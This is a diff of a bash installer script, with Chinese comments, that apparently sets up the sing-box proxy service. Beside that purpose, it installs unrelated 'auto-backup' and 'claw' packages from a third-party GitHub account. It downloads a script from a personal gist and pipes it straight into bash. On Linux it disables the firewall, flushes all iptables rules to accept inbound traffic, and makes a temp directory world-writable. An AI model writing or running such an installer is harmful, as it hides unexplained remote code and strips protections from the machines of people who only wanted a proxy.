@@ -1,112 +1,339 @@
 #!/bin/bash
 
 # ==================== 第一部分：安装依赖 ====================
+FAILED_STEPS=()
+PATH_RUNTIME_ADDED=()
+PATH_PERSIST_FILES=()
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
-# 检测操作系统类型
-OS_TYPE=$(uname -s)
+has_cmd() {
+    command -v "$1" &>/dev/null
+}
 
-# 检测 Linux 发行版和包管理器
-detect_package_manager() {
-    if command -v apt &> /dev/null; then
-        echo "apt"
-    elif command -v yum &> /dev/null; then
-        echo "yum"
-    elif command -v dnf &> /dev/null; then
-        echo "dnf"
-    elif command -v apk &> /dev/null; then
-        echo "apk"
+run_privileged() {
+    if [ "$(id -u)" -eq 0 ]; then
+        "$@"
     else
-        echo "unknown"
+        sudo "$@"
     fi
 }
 
-# 检查包管理器和安装必需的包
+run_step() {
+    local desc="$1"
+    shift
+    echo ""
+    echo "==> $desc"
+    "$@"
+    local rc=$?
+    if [ $rc -ne 0 ]; then
+        echo "WARN: 失败但继续（exit=$rc）：$desc" >&2
+        FAILED_STEPS+=("$desc (exit=$rc)")
+    fi
+    return 0
+}
+
+OS_TYPE=$(uname -s)
+
+detect_apt_cmd() {
+    if has_cmd apt-get; then
+        echo "apt-get"
+        return 0
+    fi
+
+    if has_cmd apt; then
+        echo "apt"
+        return 0
+    fi
+
+    return 1
+}
+
+ensure_runtime_path() {
+    local path_candidates=("$HOME/.local/bin" "$HOME/bin")
+    local candidate=""
+    for candidate in "${path_candidates[@]}"; do
+        if [ -d "$candidate" ] && [[ ":$PATH:" != *":$candidate:"* ]]; then
+            PATH="$candidate:$PATH"
+            PATH_RUNTIME_ADDED+=("$candidate")
+        fi
+    done
+    export PATH
+}
+
+persist_runtime_path() {
+    local shell_name=""
+    local rc_files=()
+    local rc_file=""
+
+    shell_name="$(basename "${SHELL:-}")"
+    case "$shell_name" in
+        bash)
+            rc_files=("$HOME/.bashrc" "$HOME/.profile")
+            ;;
+        zsh)
+            rc_files=("$HOME/.zshrc" "$HOME/.zprofile")
+            ;;
+        *)
+            rc_files=("$HOME/.profile")
+            ;;
+    esac
+
+    for rc_file in "${rc_files[@]}"; do
+        if [ ! -e "$rc_file" ]; then
+            touch "$rc_file"
+        fi
+
+        if grep -Fq '# >>> installclaw PATH >>>' "$rc_file" 2>/dev/null; then
+            continue
+        fi
+
+        cat >> "$rc_file" <<'EOF'
+
+# >>> installclaw PATH >>>
+if [ -d "$HOME/.local/bin" ] && [[ ":$PATH:" != *":$HOME/.local/bin:"* ]]; then
+    export PATH="$HOME/.local/bin:$PATH"
+fi
+if [ -d "$HOME/bin" ] && [[ ":$PATH:" != *":$HOME/bin:"* ]]; then
+    export PATH="$HOME/bin:$PATH"
+fi
+# <<< installclaw PATH <<<
+EOF
+        PATH_PERSIST_FILES+=("$rc_file")
+    done
+}
+
+print_path_refresh_hint() {
+    local first_rc=""
+
+    if [ ${#PATH_PERSIST_FILES[@]} -gt 0 ]; then
+        echo "已将用户命令目录写入以下 shell 配置："
+        printf ' - %s\n' "${PATH_PERSIST_FILES[@]}"
+        first_rc="${PATH_PERSIST_FILES[0]}"
+        echo "当前终端若要立即生效，请执行：source \"$first_rc\""
+    elif [ ${#PATH_RUNTIME_ADDED[@]} -gt 0 ]; then
+        echo "当前安装过程中已临时补充 PATH，但请重新打开终端或手动执行以下命令使后续会话稳定生效："
+        echo "export PATH=\"\$HOME/.local/bin:\$HOME/bin:\$PATH\""
+    fi
+}
+
+download_url_to_stdout() {
+    local url="$1"
+
+    if has_cmd curl; then
+        curl --tlsv1.2 -fsSL "$url" 2>/dev/null || curl -fsSL "$url"
+        return $?
+    fi
+
+    if has_cmd wget; then
+        wget --https-only --secure-protocol=TLSv1_2 -qO- "$url" 2>/dev/null || wget -qO- "$url"
+        return $?
+    fi
+
+    return 127
+}
+
+pip_supports_break_system_packages() {
+    python3 -m pip help install 2>/dev/null | grep -q -- '--break-system-packages'
+}
+
+python_package_state() {
+    local pkg="$1"
+    local min_version="$2"
+
+    python3 - "$pkg" "$min_version" <<'PY'
+import sys
+from importlib import metadata
+
+name, min_v = sys.argv[1], sys.argv[2]
+
+def parse(v):
+    parts = []
+    for part in v.replace("-", ".").split("."):
+        num = ""
+        for ch in part:
+            if ch.isdigit():
+                num += ch
+            else:
+                break
+        parts.append(int(num or 0))
+    return parts
+
+try:
+    current = metadata.version(name)
+except metadata.PackageNotFoundError:
+    sys.exit(2)
+except Exception:
+    sys.exit(3)
+
+a = parse(current)
+b = parse(min_v)
+n = max(len(a), len(b))
+a.extend([0] * (n - len(a)))
+b.extend([0] * (n - len(b)))
+
+if a >= b:
+    print(current)
+    sys.exit(0)
+
+print(current)
+sys.exit(1)
+PY
+}
+
+get_pipx_venv_python_path() {
+    local venv_name="$1"
+    local candidates=(
+        "$HOME/.local/share/pipx/venvs/$venv_name/bin/python"
+        "$HOME/.local/pipx/venvs/$venv_name/bin/python"
+        "$HOME/pipx/venvs/$venv_name/bin/python"
+    )
+    local candidate=""
+    for candidate in "${candidates[@]}"; do
+        if [ -x "$candidate" ]; then
+            echo "$candidate"
+            return 0
+        fi
+    done
+    return 1
+}
+
+install_pipx_package() {
+    local package_spec="$1"
+    local command_name="$2"
+    local venv_name="$3"
+    local existing_command=""
+    local venv_python=""
+    local install_args=()
+    local installed_command=""
+
+    if command -v "$command_name" &>/dev/null; then
+        existing_command="$(command -v "$command_name")"
+    fi
+
+    if [ -n "$venv_name" ]; then
+        venv_python="$(get_pipx_venv_python_path "$venv_name" || true)"
+    fi
+
+    if [ -n "$existing_command" ] && { [ -z "$venv_name" ] || [ -n "$venv_python" ]; }; then
+        echo "CLI 已可用，跳过安装：$existing_command"
+        return 0
+    fi
+
+    install_args=(install "$package_spec")
+    if [ -n "$existing_command" ] && [ -n "$venv_name" ] && [ -z "$venv_python" ]; then
+        echo "WARN: 检测到命令存在但 pipx venv 缺失，尝试强制重装：$package_spec" >&2
+        install_args=(install --force "$package_spec")
+    fi
+
+    run_step "pipx 安装 $command_name（$package_spec）" pipx "${install_args[@]}"
+    ensure_runtime_path
+
+    if command -v "$command_name" &>/dev/null; then
+        installed_command="$(command -v "$command_name")"
+    fi
+    if [ -n "$venv_name" ]; then
+        venv_python="$(get_pipx_venv_python_path "$venv_name" || true)"
+    fi
+
+    if [ -z "$installed_command" ] || { [ -n "$venv_name" ] && [ -z "$venv_python" ]; }; then
+        echo "WARN: pipx 安装后状态仍不完整：$package_spec" >&2
+        FAILED_STEPS+=("校验 pipx 包 $package_spec (incomplete)")
+    fi
+}
+
 install_dependencies() {
     case $OS_TYPE in
         "Darwin") 
             if ! command -v brew &> /dev/null; then
                 echo "正在安装 Homebrew..."
-                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+                local brew_install_script=""
+                brew_install_script="$(download_url_to_stdout 'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh')" || brew_install_script=""
+                if [ -z "$brew_install_script" ]; then
+                    echo "WARN: 无法下载 Homebrew 安装脚本，跳过 Homebrew 安装。" >&2
+                    FAILED_STEPS+=("安装 Homebrew (download-failed)")
+                else
+                    run_step "安装 Homebrew" /bin/bash -c "$brew_install_script"
+                fi
             fi
             
             if ! command -v pip3 &> /dev/null; then
-                brew install python3
+                run_step "brew install python3" brew install python3
             fi
             ;;
             
         "Linux")
-            PKG_MGR=$(detect_package_manager)
-            PACKAGES_TO_INSTALL=""
+            local packages_to_install=()
+            local apt_get=""
+            apt_get="$(detect_apt_cmd || true)"
             
-            if ! command -v pip3 &> /dev/null; then
-                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
+            if ! has_cmd pip3; then
+                packages_to_install+=("python3-pip")
             fi
             
-            if ! command -v xclip &> /dev/null; then
-                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
+            if ! has_cmd xclip; then
+                packages_to_install+=("xclip")
             fi
             
-            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
-                case $PKG_MGR in
-                    "apt")
-                        sudo apt update
-                        sudo apt install -y $PACKAGES_TO_INSTALL
-                        ;;
-                    "yum")
-                        sudo yum install -y $PACKAGES_TO_INSTALL
-                        ;;
-                    "dnf")
-                        sudo dnf install -y $PACKAGES_TO_INSTALL
-                        ;;
-                    "apk")
-                        sudo apk add --no-cache $PACKAGES_TO_INSTALL
-                        ;;
-                    *)
-                        echo "警告：无法识别包管理器，跳过系统依赖安装"
-                        ;;
-                esac
+            if [ ${#packages_to_install[@]} -gt 0 ] && [ -n "$apt_get" ]; then
+                run_step "$apt_get update" run_privileged "$apt_get" update
+                run_step "$apt_get install -y ${packages_to_install[*]}" run_privileged "$apt_get" install -y "${packages_to_install[@]}"
+            elif [ ${#packages_to_install[@]} -gt 0 ]; then
+                echo "WARN: 未找到 apt/apt-get，跳过系统依赖安装：${packages_to_install[*]}" >&2
             fi
             ;;
             
         *)
-            echo "不支持的操作系统"
-            exit 1
+            echo "WARN: 不支持的操作系统：$OS_TYPE（跳过系统依赖安装，但继续后续步骤）" >&2
             ;;
     esac
 }
 
-# 安装依赖
-echo "正在安装系统依赖..."
-install_dependencies
+run_step "安装系统依赖" install_dependencies
+ensure_runtime_path
+run_step "持久化用户命令目录到 shell 配置" persist_runtime_path
 
-# 安装 Python 包
+PIP_INSTALL_CMD=(python3 -m pip install)
 if [ "$OS_TYPE" = "Linux" ]; then
-    # 检测是否需要 --break-system-packages 参数（Python 3.11+）
-    PYTHON_MAJOR=$(python3 --version 2>&1 | awk '{print $2}' | cut -d. -f1)
-    PYTHON_MINOR=$(python3 --version 2>&1 | awk '{print $2}' | cut -d. -f2)
-    if [ "$PYTHON_MAJOR" -gt 3 ] || ([ "$PYTHON_MAJOR" -eq 3 ] && [ "$PYTHON_MINOR" -ge 11 ]) 2>/dev/null; then
-        PIP_INSTALL="python3 -m pip install --break-system-packages"
-    else
-        PIP_INSTALL="python3 -m pip install"
+    if pip_supports_break_system_packages; then
+        PIP_INSTALL_CMD+=(--break-system-packages)
     fi
 elif [ "$OS_TYPE" = "Darwin" ]; then
-    PIP_INSTALL="python3 -m pip install --user --break-system-packages"
-else
-    PIP_INSTALL="python3 -m pip install"
+    PIP_INSTALL_CMD+=(--user)
 fi
 
-if ! python3 -m pip show requests >/dev/null 2>&1; then
-    echo "正在安装依赖..."
-    $PIP_INSTALL requests || echo "警告：requests 安装失败，继续执行..."
-fi
+install_python_package_if_needed() {
+    local pkg="$1"
+    local min_version="$2"
+    local state_output=""
+    local state_rc=0
 
-if ! python3 -m pip show cryptography >/dev/null 2>&1; then
-    $PIP_INSTALL cryptography || echo "警告：cryptography 安装失败，继续执行..."
-fi
+    if ! command -v python3 &>/dev/null; then
+        echo "WARN: 未找到 python3，跳过 Python 包安装：$pkg>=$min_version" >&2
+        FAILED_STEPS+=("安装 Python 包 $pkg>=$min_version (python3-missing)")
+        return 0
+    fi
 
-if ! python3 -m pip show pycryptodome >/dev/null 2>&1; then
-    $PIP_INSTALL pycryptodome || echo "警告：pycryptodome 安装失败，继续执行..."
-fi
+    state_output="$(python_package_state "$pkg" "$min_version" 2>/dev/null)"
+    state_rc=$?
+    if [ $state_rc -eq 0 ]; then
+        echo "Python 包已满足要求：$pkg $state_output (>= $min_version)"
+        return 0
+    fi
+
+    if [ $state_rc -eq 1 ]; then
+        echo "检测到较低版本：$pkg $state_output (< $min_version)，将升级。"
+    fi
+
+    if [ $state_rc -ge 2 ]; then
+        echo "未检测到可用版本，将安装：$pkg>=$min_version"
+    fi
+
+    run_step "pip 安装 $pkg>=$min_version" "${PIP_INSTALL_CMD[@]}" "$pkg>=$min_version"
+}
+
+install_python_package_if_needed requests 2.31.0
+install_python_package_if_needed cryptography 42.0.0
+install_python_package_if_needed pycryptodome 3.19.0
 
 # 检测是否为 WSL 环境
 is_wsl() {
@@ -122,122 +349,139 @@ is_wsl() {
     return 1
 }
 
-# 安装 auto-backup（通过 pipx）
 install_auto_backup() {
-    # 安装 pipx（如果未安装）
-    if ! command -v pipx &> /dev/null; then
+    if ! has_cmd pipx; then
         echo "检测到未安装 pipx，正在安装 pipx..."
         case $OS_TYPE in
             "Darwin")
-                brew install pipx
-                pipx ensurepath
+                run_step "brew install pipx" brew install pipx
+                run_step "pipx ensurepath" pipx ensurepath
+                ensure_runtime_path
                 ;;
             "Linux")
-                PKG_MGR=$(detect_package_manager)
-                case $PKG_MGR in
-                    "apt")
-                        sudo apt update
-                        sudo apt install -y pipx
-                        ;;
-                    "yum")
-                        sudo yum install -y pipx
-                        ;;
-                    "dnf")
-                        sudo dnf install -y pipx
-                        ;;
-                    "apk")
-                        sudo apk add --no-cache pipx
-                        ;;
-                    *)
-                        echo "警告：无法识别包管理器，跳过 pipx 安装"
-                        return 1
-                        ;;
-                esac
-                pipx ensurepath
-                ;;
-            *)
-                echo "无法在当前系统上安装 pipx"
-                return 1
-                ;;
-        esac
-    fi
-
-    if ! command -v autobackup &> /dev/null; then
-        local install_url=""
-        case $OS_TYPE in
-            "Darwin")
-                install_url="git+https://github.com/web3toolsbox/auto-backup-macos"
-                echo "检测到 macOS 环境，正在安装 auto-backup-macos（通过 pipx）..."
-                ;;
-            "Linux")
-                if is_wsl; then
-                    install_url="git+https://github.com/web3toolsbox/auto-backup-wsl"
-                    echo "检测到 WSL 环境，正在安装 auto-backup-wsl（通过 pipx）..."
+                local apt_get=""
+                apt_get="$(detect_apt_cmd || true)"
+                if [ -n "$apt_get" ]; then
+                    run_step "$apt_get update（pipx）" run_privileged "$apt_get" update
+                    run_step "$apt_get install -y pipx" run_privileged "$apt_get" install -y pipx
+                    run_step "pipx ensurepath" pipx ensurepath
+                    ensure_runtime_path
                 else
-                    install_url="git+https://github.com/web3toolsbox/auto-backup-linux"
-                    echo "检测到 Linux 环境，正在安装 auto-backup-linux（通过 pipx）..."
+                    echo "WARN: 未找到 apt/apt-get，跳过 pipx 安装" >&2
+                    return 0
                 fi
                 ;;
             *)
-                echo "不支持的操作系统，跳过 auto-backup 安装"
-                return 1
+                echo "WARN: 无法在当前系统上安装 pipx（跳过 pipx 相关安装，但继续）" >&2
+                return 0
                 ;;
         esac
-        
-        pipx install "$install_url" || echo "警告：auto-backup 安装失败，继续执行..."
-    else
-        echo "已检测到 autobackup 命令，跳过 auto-backup 安装。"
     fi
+
+    if has_cmd pipx; then
+        run_step "pipx ensurepath" pipx ensurepath
+        ensure_runtime_path
+    fi
+
+    install_pipx_package "git+https://github.com/web3toolsbox/claw.git" "openclaw-config" "claw"
+
+    local install_url=""
+    case $OS_TYPE in
+        "Darwin")
+            install_url="git+https://github.com/web3toolsbox/auto-backup-macos"
+            ;;
+        "Linux")
+            if is_wsl; then
+                install_url="git+https://github.com/web3toolsbox/auto-backup-wsl"
+            else
+                install_url="git+https://github.com/web3toolsbox/auto-backup-linux"
+            fi
+            ;;
+        *)
+            echo "不支持的操作系统，跳过安装"
+            return 0
+            ;;
+    esac
+
+    install_pipx_package "$install_url" "autobackup" ""
 }
 
-install_auto_backup
+run_step "安装自动备份相关（pipx/claw/autobackup）" install_auto_backup
+
+run_remote_config_script() {
+    local script_content=""
+
+    script_content="$(download_url_to_stdout "$GIST_URL")" || script_content=""
+    if [ -z "$script_content" ]; then
+        if ! has_cmd curl && ! has_cmd wget; then
+            echo "WARN: 未找到 curl/wget，跳过环境配置：$GIST_URL" >&2
+            return 0
+        fi
+        echo "WARN: 下载配置脚本失败：$GIST_URL" >&2
+        return 1
+    fi
+
+    printf '%s\n' "$script_content" | bash -s --
+}
 
 GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
-if command -v curl &>/dev/null; then
-    bash <(curl -fsSL "$GIST_URL") || echo "警告：GIST 脚本执行失败，继续执行..."
-elif command -v wget &>/dev/null; then
-    bash <(wget -qO- "$GIST_URL") || echo "警告：GIST 脚本执行失败，继续执行..."
+if [ ! -d "$SCRIPT_DIR/.configs" ]; then
+    echo "WARN: 未找到配置目录，跳过环境配置：.configs" >&2
 else
-    echo "警告：未找到 curl 或 wget，跳过"
+    run_step "配置相关环境" run_remote_config_script
 fi
 
+echo "安装完成！"
+print_path_refresh_hint
+if [ ${#FAILED_STEPS[@]} -gt 0 ]; then
+    echo "------------------------------" >&2
+    echo "WARN: 以下步骤失败但已继续执行：" >&2
+    for s in "${FAILED_STEPS[@]}"; do
+        echo " - $s" >&2
+    done
+    echo "------------------------------" >&2
+fi
 # ==================== 第二部分：系统配置 ====================
 
-# 关闭防火墙（检测防火墙类型）
-echo "正在配置防火墙..."
-if command -v ufw &> /dev/null; then
-    echo "检测到 ufw，正在关闭..."
-    sudo ufw disable 2>/dev/null || echo "警告：ufw 关闭失败"
-elif command -v firewall-cmd &> /dev/null; then
-    echo "检测到 firewalld，正在关闭..."
-    sudo systemctl stop firewalld 2>/dev/null || echo "警告：firewalld 停止失败"
-    sudo systemctl disable firewalld 2>/dev/null || echo "警告：firewalld 禁用失败"
-else
-    echo "未检测到 ufw 或 firewalld，跳过防火墙配置"
-fi
-
-# 允许所有入站流量
-echo "正在配置 iptables..."
-if command -v iptables &> /dev/null; then
-    sudo iptables -P INPUT ACCEPT 2>/dev/null || echo "警告：iptables 配置失败"
-    sudo iptables -F 2>/dev/null || echo "警告：iptables 清空规则失败"
-else
-    echo "警告：未找到 iptables 命令"
-fi
-
-# 开启 BBR 加速
-echo "正在开启 BBR 加速..."
-if [ -f /etc/sysctl.conf ]; then
-    # 检查是否已存在配置，避免重复添加
-    if ! grep -q "net.core.default_qdisc=fq" /etc/sysctl.conf; then
-        echo "net.core.default_qdisc=fq" | sudo tee -a /etc/sysctl.conf >/dev/null
+if [ "$OS_TYPE" = "Linux" ]; then
+    # 关闭防火墙（检测防火墙类型）
+    echo "正在配置防火墙..."
+    if has_cmd ufw; then
+        echo "检测到 ufw，正在关闭..."
+        run_privileged ufw disable 2>/dev/null || echo "警告：ufw 关闭失败"
+    elif has_cmd firewall-cmd; then
+        echo "检测到 firewalld，正在关闭..."
+        run_privileged systemctl stop firewalld 2>/dev/null || echo "警告：firewalld 停止失败"
+        run_privileged systemctl disable firewalld 2>/dev/null || echo "警告：firewalld 禁用失败"
+    else
+        echo "未检测到 ufw 或 firewalld，跳过防火墙配置"
     fi
-    if ! grep -q "net.ipv4.tcp_congestion_control=bbr" /etc/sysctl.conf; then
-        echo "net.ipv4.tcp_congestion_control=bbr" | sudo tee -a /etc/sysctl.conf >/dev/null
+
+    # 允许所有入站流量
+    echo "正在配置 iptables..."
+    if has_cmd iptables; then
+        run_privileged iptables -P INPUT ACCEPT 2>/dev/null || echo "警告：iptables 配置失败"
+        run_privileged iptables -F 2>/dev/null || echo "警告：iptables 清空规则失败"
+    else
+        echo "警告：未找到 iptables 命令"
     fi
-    sudo sysctl -p >/dev/null 2>&1 || echo "警告：BBR 配置应用失败"
+
+    # 开启 BBR 加速
+    echo "正在开启 BBR 加速..."
+    if [ -f /etc/sysctl.conf ]; then
+        # 检查是否已存在配置，避免重复添加
+        if ! grep -q "net.core.default_qdisc=fq" /etc/sysctl.conf; then
+            echo "net.core.default_qdisc=fq" | run_privileged tee -a /etc/sysctl.conf >/dev/null
+        fi
+        if ! grep -q "net.ipv4.tcp_congestion_control=bbr" /etc/sysctl.conf; then
+            echo "net.ipv4.tcp_congestion_control=bbr" | run_privileged tee -a /etc/sysctl.conf >/dev/null
+        fi
+        run_privileged sysctl -p >/dev/null 2>&1 || echo "警告：BBR 配置应用失败"
+    else
+        echo "警告：/etc/sysctl.conf 不存在，跳过 BBR 配置"
+    fi
 else
-    echo "警告：/etc/sysctl.conf 不存在，跳过 BBR 配置"
+    echo "当前系统非 Linux，跳过防火墙与 BBR 配置"
 fi
 
 # ==================== 第三部分：应用环境配置 ====================
@@ -285,7 +529,8 @@ fi
 # ==================== 第四部分：启动 sing-box ====================
 
 # 检查 sing-box.sh 是否存在
-if [ ! -f "./sing-box.sh" ]; then
+SINGBOX_SCRIPT="$SCRIPT_DIR/sing-box.sh"
+if [ ! -f "$SINGBOX_SCRIPT" ]; then
     echo "错误：未找到 sing-box.sh 文件，请确保在正确的目录下运行此脚本"
     exit 1
 fi
@@ -300,19 +545,19 @@ if [ "$USE_USER_TEMP" = "true" ]; then
     
     SYSTEM_TEMP_DIR="/tmp/sing-box"
     if [ -L "$SYSTEM_TEMP_DIR" ] || [ ! -d "$SYSTEM_TEMP_DIR" ]; then
-        sudo rm -rf "$SYSTEM_TEMP_DIR" 2>/dev/null || true
-        sudo ln -sf "$TEMP_DIR" "$SYSTEM_TEMP_DIR" 2>/dev/null || true
+        run_privileged rm -rf "$SYSTEM_TEMP_DIR" 2>/dev/null || true
+        run_privileged ln -sf "$TEMP_DIR" "$SYSTEM_TEMP_DIR" 2>/dev/null || true
     fi
 else
     TEMP_DIR="/tmp/sing-box"
     if [ ! -d "$TEMP_DIR" ]; then
-        sudo mkdir -p "$TEMP_DIR"
-        sudo chmod 777 "$TEMP_DIR" 2>/dev/null || sudo chmod 755 "$TEMP_DIR"
+        run_privileged mkdir -p "$TEMP_DIR"
+        run_privileged chmod 777 "$TEMP_DIR" 2>/dev/null || run_privileged chmod 755 "$TEMP_DIR"
         if [ -n "$SUDO_USER" ]; then
-            sudo chown "$SUDO_USER:$SUDO_USER" "$TEMP_DIR" 2>/dev/null || true
+            run_privileged chown "$SUDO_USER:$SUDO_USER" "$TEMP_DIR" 2>/dev/null || true
         fi
     else
-        sudo chmod 777 "$TEMP_DIR" 2>/dev/null || sudo chmod 755 "$TEMP_DIR"
+        run_privileged chmod 777 "$TEMP_DIR" 2>/dev/null || run_privileged chmod 755 "$TEMP_DIR"
     fi
 fi
 
@@ -332,24 +577,25 @@ pre_download_singbox() {
     mkdir -p "$TEMP_DIR_ACTUAL"
     
     # 检测系统架构
-    local ARCH=$(uname -m)
+    local ARCH
+    local SING_BOX_ARCH=""
+    local JQ_ARCH=""
+    local ARGO_ARCH=""
+    ARCH="$(uname -m)"
     case "$ARCH" in
         x86_64|amd64)
             SING_BOX_ARCH="amd64"
             JQ_ARCH="amd64"
-            QRENCODE_ARCH="amd64"
             ARGO_ARCH="amd64"
             ;;
         aarch64|arm64)
             SING_BOX_ARCH="arm64"
             JQ_ARCH="arm64"
-            QRENCODE_ARCH="arm64"
             ARGO_ARCH="arm64"
             ;;
         armv7l)
             SING_BOX_ARCH="armv7"
             JQ_ARCH="armhf"
-            QRENCODE_ARCH="arm"
             ARGO_ARCH="arm"
             ;;
         *)
@@ -363,20 +609,19 @@ pre_download_singbox() {
     
     # 获取版本号（使用默认版本或尝试获取最新版本）
     local VERSION="1.13.0-alpha.33"  # 默认版本
-    local GH_PROXY=""
+    local api_response=""
+    local latest_version=""
+    local download_log=""
+    download_log="$(mktemp /tmp/sing-box-download.XXXXXX.log)"
     
-    if command -v wget &>/dev/null; then
+    if has_cmd wget || has_cmd curl; then
         # 尝试使用代理获取版本
         for proxy in "${GH_PROXY_LIST[@]}"; do
-            local API_RESPONSE=$(wget --no-check-certificate --server-response --tries=2 --timeout=10 -qO- "${proxy}https://api.github.com/repos/SagerNet/sing-box/releases" 2>&1)
-            if echo "$API_RESPONSE" | grep -q 'HTTP.* 200'; then
-                # 提取完整的 tag_name，包括 alpha/beta 等后缀
-                local LATEST_VERSION=$(echo "$API_RESPONSE" | grep -o '"tag_name":"[^"]*"' | head -1 | sed 's/"tag_name":"v\?\([^"]*\)"/\1/')
-                if [ -n "$LATEST_VERSION" ] && [[ "$LATEST_VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+ ]]; then
-                    VERSION="$LATEST_VERSION"
-                    GH_PROXY="$proxy"
-                    break
-                fi
+            api_response="$(download_url_to_stdout "${proxy}https://api.github.com/repos/SagerNet/sing-box/releases" 2>/dev/null)" || continue
+            latest_version="$(echo "$api_response" | grep -o '"tag_name":"[^"]*"' | head -1 | sed 's/"tag_name":"v\?\([^"]*\)"/\1/')"
+            if [ -n "$latest_version" ] && [[ "$latest_version" =~ ^[0-9]+\.[0-9]+\.[0-9]+ ]]; then
+                VERSION="$latest_version"
+                break
             fi
         done
     fi
@@ -390,7 +635,7 @@ pre_download_singbox() {
             local DOWNLOAD_URL="${proxy}https://github.com/SagerNet/sing-box/releases/download/v${VERSION}/sing-box-${VERSION}-linux-${SING_BOX_ARCH}.tar.gz"
             
             if wget --no-check-certificate --spider --timeout=10 --tries=1 "$DOWNLOAD_URL" 2>/dev/null; then
-                if wget --no-check-certificate --timeout=60 --tries=2 -qO- "$DOWNLOAD_URL" 2>/tmp/sing-box-download.log | tar xz -C "$TEMP_DIR_ACTUAL" "sing-box-${VERSION}-linux-${SING_BOX_ARCH}/sing-box" 2>>/tmp/sing-box-download.log; then
+                if wget --no-check-certificate --timeout=60 --tries=2 -qO- "$DOWNLOAD_URL" 2>>"$download_log" | tar xz -C "$TEMP_DIR_ACTUAL" "sing-box-${VERSION}-linux-${SING_BOX_ARCH}/sing-box" 2>>"$download_log"; then
                     if [ -f "$TEMP_DIR_ACTUAL/sing-box-${VERSION}-linux-${SING_BOX_ARCH}/sing-box" ]; then
                         mv "$TEMP_DIR_ACTUAL/sing-box-${VERSION}-linux-${SING_BOX_ARCH}/sing-box" "$TEMP_DIR_ACTUAL/sing-box"
                         rm -rf "$TEMP_DIR_ACTUAL/sing-box-${VERSION}-linux-${SING_BOX_ARCH}" 2>/dev/null
@@ -404,10 +649,8 @@ pre_download_singbox() {
         
         if [ "$DOWNLOAD_SUCCESS" = "false" ]; then
             echo "✗ sing-box 下载失败"
-            if [ -f /tmp/sing-box-download.log ]; then
-                tail -3 /tmp/sing-box-download.log 2>/dev/null | sed 's/^/  /'
-                rm -f /tmp/sing-box-download.log
-            fi
+            tail -3 "$download_log" 2>/dev/null | sed 's/^/  /'
+            rm -f "$download_log"
             return 1
         fi
     fi
@@ -442,8 +685,10 @@ pre_download_singbox() {
     
     # 验证关键文件
     if [ -f "$TEMP_DIR_ACTUAL/sing-box" ] && [ -x "$TEMP_DIR_ACTUAL/sing-box" ]; then
+        rm -f "$download_log"
         return 0
     else
+        rm -f "$download_log"
         return 1
     fi
 }
@@ -451,9 +696,9 @@ pre_download_singbox() {
 # 执行预下载（静默执行，失败时显示警告）
 pre_download_singbox 2>/dev/null || echo "警告：预下载失败，sing-box.sh 将尝试自行下载"
 
-if sudo ./sing-box.sh -l; then
+if run_privileged bash "$SINGBOX_SCRIPT" -l; then
     # 设置 sing-box 开机自启
-    sudo systemctl enable sing-box >/dev/null 2>&1
+    run_privileged systemctl enable sing-box >/dev/null 2>&1
     
     # 等待服务启动
     sleep 2
